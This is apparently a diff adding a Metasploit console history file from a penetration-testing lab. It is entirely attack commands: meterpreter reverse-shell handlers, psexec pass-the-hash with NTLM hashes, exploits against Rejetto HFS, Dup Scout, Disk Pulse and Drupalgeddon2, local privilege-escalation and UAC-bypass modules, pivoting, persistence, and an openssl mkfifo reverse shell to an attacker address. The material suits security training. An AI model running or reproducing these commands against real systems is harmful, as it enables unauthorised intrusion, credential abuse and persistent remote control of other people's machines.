@@ -1,0 +1,673 @@
+db_status 
+exit
+db_status 
+exit
+tips 
+db_status 
+workspace 
+hosts 
+db_nmap -h
+services 
+services -h
+db_nmap -h
+creds 
+loot 
+quit
+exit
+use exploit/multi/handler 
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.13.129
+set lport 8443
+run
+use exploit/windows/smb/psexec
+options 
+set rhosts 192.168.13.128
+set smbdomain gohacking.lab
+set smbuser administrator
+set smbpass aad3b435b51404eeaad3b435b51404ee:7f71a6d936fa2894073d51c28fd3011e
+set payload windows/x64/meterpreter/reverse_tcp
+options 
+set lhost 192.168.13.129
+advanced 
+options 
+exploit 
+use exploit/windows/http/disk_pulse_enterprise_get 
+options 
+show info
+set rhosts 192.168.13.10
+set rport 8080
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.13.129
+set lport 443
+options 
+exploit -z
+sessions 1
+rexploit -z
+sessions 
+sessions -k 2
+sessions 3
+rexploit -z
+sessions 4
+sessions 
+makerc /root/disk.rc
+exit
+sessions 
+sessions -k 2
+sessions 1
+exit
+sessions 
+sessions 1
+use post/multi/recon/local_exploit_suggester 
+set session 1
+options 
+run
+use exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 
+options 
+set lhost 192.168.13.129
+set lport 8088
+show targets 
+set session 1
+sessions 
+sessions 1
+options 
+exploit 
+sessions 
+sessions  -K
+exit
+sessions 
+sessions 1
+use post/multi/recon/local_exploit_suggester 
+options 
+set session 1
+run
+use exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 
+options 
+set session 1
+set lhost 192.168.13.129 
+set lport 8088
+options 
+exploit 
+options 
+sessions 
+sessions  1
+use exploit/windows/local/cve_2020_0796_smbghost 
+options 
+set lhost 192.168.13.129 
+show targets 
+set session 1
+options 
+exploit 
+sessions
+sessions 1
+sessions -K
+exit
+search rejett
+use 0
+options 
+set rhosts 172.16.192.10
+set payload windows/meterpreter/reverse_tcp
+set lhost eth0
+set lport 443
+options 
+exploit -z
+sessions 
+use 1
+sessions 1
+sessions -K
+exit
+search rejetto
+use 0
+options 
+set rhosts 172.16.192.10
+set srvport 8088
+set payload windows/meterpreter/reverse_tcp
+set lport 443
+options 
+exploit -z
+sessions 
+sessions 1
+use post/multi/recon/local_exploit_suggester 
+set session 1
+options 
+run
+sessions -K
+back 
+use rejetto
+options 
+exploit -z
+sessions 
+sessions 2
+use post/multi/recon/local_exploit_suggester 
+options 
+set session 2
+run
+use exploit/windows/local/bypassuac_eventvwr 
+options 
+set session 2
+exploit -z
+use exploit/windows/local/bypassuac_fodhelper 
+options 
+set session 2
+exploit 
+use exploit/windows/local/ikeext_service 
+options 
+show targets 
+set session 2
+exploit 
+options 
+sessions 
+set target 1
+set payload windows/x64/meterpreter/reverse_tcp
+options 
+exploit 
+sessions 2
+options 
+set DIR "C:\Users\suporte\AppData\Local\Microsoft\WindowsApps"
+options 
+rexploit 
+rexploit -j
+sessions 2
+jobs 
+sessions 2
+sessions 
+jobs -K
+jobs -h
+exit
+use rejetto
+set rhosts 172.16.192.10
+set srvport 8088
+options 
+set lport 443
+options 
+exploit 
+exit
+jobs 
+search freeftp
+use 0
+options 
+show targets 
+set rhosts 172.16.192.30
+exploit 
+exit
+search smbghost
+exit
+search smbghost
+use 0
+info
+advanced 
+exit
+exit
+exit
+exit
+exit
+exit
+banner
+banner -h
+banner
+search rejetto
+banner
+search rejetto
+banner
+search rejetto
+use rejetto
+options 
+info
+options 
+set rhosts 172.16.192.30
+set srvhost 172.16.192.200
+set srvport 8088
+show options 
+set payload windows/shell_reverse_tcp 
+set lhost 172.16.192.200
+set lport 443
+options 
+exploit -z
+sessions 
+sessions 1
+sessions -i 1
+sessions 
+sessions -i 1
+sessions 1
+exit
+use rejetto
+options 
+set rhosts 172.16.192.30
+set srvhost 172.16.192.200
+set srvport 8088
+set payload windows/shell_reverse_tcp 
+set lhost 172.16.192.200
+set lport 443
+makerc /home/gohacking/outros/hfs.rc
+exploit -z
+sessions 1
+exit
+sessions 
+sessions 1
+sessions 
+sessions 1
+sessions 
+sessions -K
+rexploit -z
+sessions 2
+exit
+sessions 
+sessions 1
+set payload windows/meterpreter/reverse_tcp
+options 
+exploit -z
+sessions 
+sessions -K
+exit
+sessions 1
+set payload windows/meterpreter/reverse_
+set payload windows/meterpreter/reverse_tcp
+options 
+rexploit -z
+sessions 
+sessions -i 2
+sessions 
+sessions 2
+exit
+sessions 
+sessions -K
+exit
+sessions 
+sessions 1
+set payload windows/meterpreter/reverse_tcp
+options 
+rexploit -z
+sessions -K
+rexploit -z
+sessions -K
+exit
+sessions 1
+set payload windows/meterpreter/reverse_tcp
+options 
+rexploit -z
+sessions 2
+sessions 
+sessions 2
+sessions 
+sessions 2
+sessions 
+sessions 2
+sessions 
+sessions 2
+exit
+exit
+sessions -K
+exit
+sessions 1
+set payload windows/meterpreter/reverse_tcp
+options 
+rexploit -z
+sessions 2
+use post/windows/gather/
+use post/windows/
+use post/windows/gather/checkvm 
+show options 
+sessions 
+set session 2
+run
+use post/multi/recon/local_exploit_suggester 
+options 
+set session 2
+run
+sessions 
+sessions -K
+exit
+use rejetto
+set rhosts 172.16.192.30
+set srvport 8088
+set srvhost 172.16.192.200
+set payload windows/meterpreter/reverse_tcp
+set lhost 172.16.192.200
+set lport 443
+options 
+show op
+show options 
+exit
+use exploit/windows/http/rejetto_hfs_exec 
+set rhosts 172.16.192.30
+set srvhost 172.16.192.200
+set srvport 8088
+set payload windows/meterpreter/reverse_tcp
+set lhost 172.16.192.200
+set lport 443
+makerc /tmp/hfs.rc
+exit
+exit
+exploit -z
+sessions 
+sessions 1
+use post/multi/recon/local_exploit_suggester 
+set session 1
+run
+use exploit/windows/local/bypassuac_eventvwr 
+options 
+set session 1
+exploit -z
+sessions 
+sessions 2
+sessions 0K
+exit
+sessions 
+sessions 2
+sessions -K
+exit
+sessions 1
+use exploit/windows/local/bypassuac_eventvwr 
+options 
+set session 1
+exploit -z
+sessions 
+sessions -k 3
+sessions 2
+sessions 
+sessions -K
+exit
+sessions -K
+exit
+sessions 1
+use exploit/windows/http/dup_scout_enterprise_login_bof 
+set rhosts 127.0.0.1
+set rport 8080
+options 
+set payload windows/meterpreter/reverse_tcp
+set lhost 172.16.192.200
+set lport 8443
+options 
+exploit -z
+sessions 
+sessions 2
+sessions 
+exit
+sessions 
+sessions -K
+exit
+sessions 
+sessions 1
+use exploit/windows/http/dup_scout_enterprise_login_bof 
+options 
+sessions 1
+set rhosts 127.0.0.1
+set rport 8080
+options 
+set lport 8443
+show targets 
+exploit -z
+sessions -k 3
+sessions 
+sessions 2
+sessions 
+sessions 2
+sessions 
+sessions -K
+exit
+sessions 
+sessions 1
+sessions 
+sessions 1
+route ?
+sessions 
+route add 172.16.192.30/32 1
+route print 
+use auxiliary/scanner/portscan/tcp 
+options 
+set rhosts 172.16.192.30
+set ports 8080
+run
+options 
+route print 
+exploit 
+route ?
+route flush
+route print 
+options 
+run
+sessions 1
+sessions -K
+exit
+sessions 
+sessions -K
+exit
+sessions 1
+use auxiliary/scanner/portscan/tcp 
+options 
+use exploit/windows/http/rejetto_hfs_exec 
+route print
+route add 172.16.192.30/32 1
+route print
+use auxiliary/scanner/portscan/tcp 
+options 
+set rhosts 172.16.192.30
+set ports 8080
+run
+route flush
+run
+route add 172.16.192.30/32 1
+route print 
+use exploit/windows/http/dup_scout_enterprise_login_bof 
+set rhosts 172.16.192.30
+set rport 8080
+set payload windows/meterpreter/reverse_tcp
+set lhost eth0
+set lport 8443
+options 
+exploit -z
+sessions 
+sessions 2
+use auxiliary/server/socks4a
+show options 
+run
+jobs 
+sessions 
+sessions 2
+use exploit/windows/local/persistence
+options 
+info
+use exploit/windows/http/dup_scout_enterprise_login_bof 
+sessions 2
+use exploit/windows/local/persistence
+use exploit/windows/http/dup_scout_enterprise_login_bof 
+use exploit/windows/local/persistence
+options 
+info
+set session 2
+set startup SYSTEM
+set payload windows/meterpreter/reverse_tcp
+set lhost eth0
+set lport 443
+exploit 
+options 
+sessions -K
+exit
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp
+set lhost eth0
+set lport 
+exit
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp
+set lhost eth0
+set lport 443
+run
+rexploit 
+sessions 
+sessions -K
+sessions 
+exit
+search freeftp
+use 1
+info
+exit
+sessions 
+sessions 2
+sessions 
+sessions -K
+exit
+sessions 
+sessions 2
+sessions 
+sessions 2
+sessions -K
+exit
+sessions 
+sessions 1
+sessions -K
+exit
+sessions -K
+exit
+sessions 2
+sessions -K
+exit
+sessions 
+sessions 2
+use exploit/windows/smb/psexec
+set rhosts 172.16.192.30
+set smbuser administrator
+set smbpass aad3b435b51404eeaad3b435b51404ee:f7e4558df7c452c6129f24f8fb4574de
+set payload windows/meterpreter/reverse_tcp
+set lhost 172.16.192.200
+set lport 8000
+exploit -z
+sessions 
+sessions 3
+sessions 
+sessions -k 3
+options 
+set smbuser suporte
+set smbpass aad3b435b51404eeaad3b435b51404ee:ac0deb180d6a64bbd654aebeaa8334ed
+options 
+rexploit -z
+sessions 4
+sessions -k 4
+options 
+unset SMBUser 
+unset SMBPass 
+options 
+unset RHOSTS 
+options 
+sessions 
+sessions 2
+sessions 
+sessions 2
+sessions 
+sessions 2
+sessions 
+sessions -K
+use exploit/multi/script/web_delivery 
+options 
+show targets 
+set target 3
+options 
+set lhost eth0 
+options 
+run
+options 
+set payload windows/meterpreter/reverse_tcp
+options 
+run
+jobs 
+jobs -K
+jobs 
+exit
+search drupal
+use 6
+info
+exit
+search drupal
+use exploit/unix/webapp/drupal_drupalgeddon2
+info
+set rhosts 172.16.192.40
+set targeturi /drupal
+set payload generic/shell_reverse_tcp 
+set lhost 172.16.192.200
+set lport 443
+options 
+exploit -z
+sessions 
+sessions 1
+sessions 
+options 
+set lport 8443
+exploit
+exit
+use drupalgeddon2
+options 
+set rhosts 172.16.192.40
+set targeturi /drupal
+set payload generic/shell_reverse_tcp e
+set lhost 172.16.192.200
+set lport 8443
+set payload generic/shell_reverse_tcp 
+set lhost 172.16.192.200
+set lport 8443
+options 
+set lport 8443
+exploit 
+exit
+use drupalgeddon2
+set rhosts 172.16.192.40
+set targeturi /drupal
+set payload generic/shell_reverse_tcp 
+set lhost 172.16.192.200
+set lport 8443
+exploit 
+exit
+use drupalgeddon2
+set rhosts 172.16.192.40
+set targeturi /drupal
+set payload generic/shell_reverse_tcp 
+set lhost 172.16.192.200
+set lport 8443
+exploit 
+exit
+exit -K
+exit
+sessions -K
+exit
+use drupalgeddon2
+set targeturi /drupal
+set lport 8443
+set lhost 172.16.192.200
+set payload generic/shell_reverse_tcp 
+options 
+set rhosts 172.16.192.40
+exploit 
+set payload php/exec 
+options 
+set cmd "rm s; mkfifo s; /bin/bash < s 2>&1 | openssl s_client -connect 172.16.192.200:443 > s"
+options 
+use drupalgeddon2
+options 
+advanced 
+set payload php/exec 
+options 
+show targets 
+set rhosts 172.16.192.40
+set targeturi /drupal
+set cmd "rm /tmp/s; mkfifo /tmp/s; /bin/bash < /tmp/s 2>\&1 | openssl s_client -connect 172.16.192.200:443 > /tmp/s; rm /tmp/s"
+options 
+makerc /tmp/drupal.rc
+exploit 
+rexploit 
+set cmd "rm /tmp/s; mkfifo /tmp/s; /bin/bash < /tmp/s 2>\&1 | openssl s_client -quiet -connect 172.16.192.200:443 > /tmp/s; rm /tmp/s"
+rexploit 
+use drupalgeddon2
+set rhosts 172.16.192.40
+set targeturi /drupal
+set payload php/exec 
+set cmd "rm /tmp/s; mkfifo /tmp/s; /bin/bash < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.16.210.200:443 > /tmp/s; rm /tmp/s"
+options 
+exit
+exploit 
+set cmd "rm /tmp/s; mkfifo /tmp/s; /bin/bash < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.16.192.200:443 > /tmp/s; rm /tmp/s"
+options 
+exploit 
+set payload generic/shell_reverse_tcp 
+options 
+exploit 
+exit
+search cve:2020 type:exploit
+exit
